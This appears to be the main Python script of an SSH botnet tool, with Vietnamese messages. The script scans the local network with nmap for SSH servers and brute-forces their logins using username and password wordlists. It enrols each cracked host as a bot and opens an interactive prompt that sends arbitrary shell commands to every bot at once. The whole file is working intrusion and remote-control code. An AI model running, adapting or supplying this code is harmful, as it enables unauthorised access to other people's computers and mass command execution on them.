import os
import nmap
from termcolor import colored
from botnet import Botnet
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Network interface")

    args = parser.parse_args()
    if not args.interface:
        print("[-] Specify network interface\n")
        parser.print_help()
        exit()

    return args

def getSshServers(myip):
    nm = nmap.PortScanner()

    print("\n[*] Scanning network for ssh servers ...")
    nm.scan(myip + '/24')
    print("[+] Scan complete\n")

    hosts = list(nm.all_hosts())
    # hosts.remove(myip)

    if not hosts:
        print("[-] No live hosts other than you found on this network")
        exit()

    print("hosts: ", hosts)

    ssh_servers = {}
    for i in hosts:
        # open_ports = list(nm[i]['tcp'].keys())
        # Phương thức get() sẽ trả về giá trị của khóa 'tcp' trong từ điển nm[i] nếu nó tồn tại, nếu không, nó sẽ trả về một từ điển trống {}
        open_ports = list(nm[i].get('tcp', {}).keys())
        for j in open_ports:
            print('host: ', i, ', port: ', j, ', protocol: ', nm[i]['tcp'][j]['name'])
            # return
            if nm[i]['tcp'][j]['name'] == 'ssh':
                por = j
                ssh_servers[i] = j
                break
            por = -1

    return ssh_servers

def listSshServers(ssh_servers):
    print("Running ssh servers : ")
    with open('session.txt', 'w') as f2:
        for i, j in ssh_servers.items():
            print("Host : " + i + "\t\t" + "port : " + str(j))
            f2.write(i + ":" + str(j) + '\n')
    print('\n')

def getUsernames(fileName):
    usernames = []
    with open(fileName, "r") as file:
        for line in file:
            usernames.append(line.strip())
    return usernames

def getPasswords(fileName):
    passwords = []
    with open(fileName, "r") as file:
        for line in file:
            passwords.append(line.strip())
    return passwords

def main():
    options = get_arguments()
    print("""
             _         _           _              _   
     ___ ___| |__     | |__   ___ | |_ _ __   ___| |_ 
    / __/ __| '_ \    | '_ \ / _ \| __| '_ \ / _ \ __|
    \__ \__ \ | | |   | |_) | (_) | |_| | | |  __/ |_ 
    |___/___/_| |_|___|_.__/ \___/ \__|_| |_|\___|\__|
                 |_____|                              
    """)

    interface = options.interface

    # myip = os.popen("ifconfig " + interface + " | grep \"inet \" | awk \'{print $2}\'").read().replace("\n", "")
    
    output = os.popen("ipconfig").read()
    myip = output[output.index(interface):].split("IPv4 Address")[1].split(": ")[1].split("\n")[0]

    ssh_servers = getSshServers(myip)

    if not ssh_servers:
        print("Rất tiếc!!! Không có máy nào sử dụng ssh protocol!!!")

    else:
        listSshServers(ssh_servers)

        choice = input("Tiếp tục thêm bots vào botnet nhé?[Y/n] ")
        print("\n")
        if choice.lower() in ["n", "no"]:
            exit()

        botnet = Botnet()

        usernames = getUsernames('username_wordlist.txt')
        passwords = getPasswords('passwd_wordlist.txt')
        retry_delay = 30
        for i, j in ssh_servers.items():
            for username in usernames:
                found_username = None  # Khởi tạo biến để lưu trữ username được tìm thấy
                found_password = None  # Khởi tạo biến để lưu trữ mật khẩu được tìm thấy
                k = 0
                while k < len(passwords):
                    password = passwords[k].strip()
                    # try:
                    print(f"(+) Try password: {password}")
                    # Kết nối đến máy chủ
                    
                    result = botnet.addBot(i, username, password, j)
                    if str(result) == 'Authentication failed.':
                        print("error pass")
                    elif isinstance(result, Exception):
                        print(f"Error: {result}. Retrying in {retry_delay} seconds...")
                        time.sleep(retry_delay)  # Đợi 2 phút trước khi thử lại
                        k -= 1
                    else:
                        found_username = username
                        found_password = password
                        break
                    k += 1
                if found_password is not None:
                    print("*_* Found successful password: " + found_password + " .for username : " + found_username)
                    break
           

        if not botnet.botNet:
            print()
            print('[-] Thật sự rất buồn! Không có bot nào trong danh sách!!!')
        else:
            print()
            print(f'[+] Chúc mừng bạn!!! Bạn đã thu thập được {len(botnet.botNet)} con bot trong botnet:')
            for i in botnet.botNet:
                print(f'>>> host: {i.host}, port: {i.port}')
            print()
            print('[+] Hãy bắt đầu điều khiển chúng nhé!!!')
            while True:
                strr = colored('ssh@botnet:~$ ', 'red', None, ['bold'])
                a = input(strr)

                if a == "exit()" or a == "exit":
                    botnet.f.close()
                    print("\n[*] Lịch sử câu lệnh được lưu ở trong file logs.txt")
                    break
                else:
                    botnet.sendCommandsToBots(a)
            # botnet.uploadFile('C:\\Users\\tuana\\Downloads\\SSH-botnet.zip')

if __name__ == "__main__":
    main()
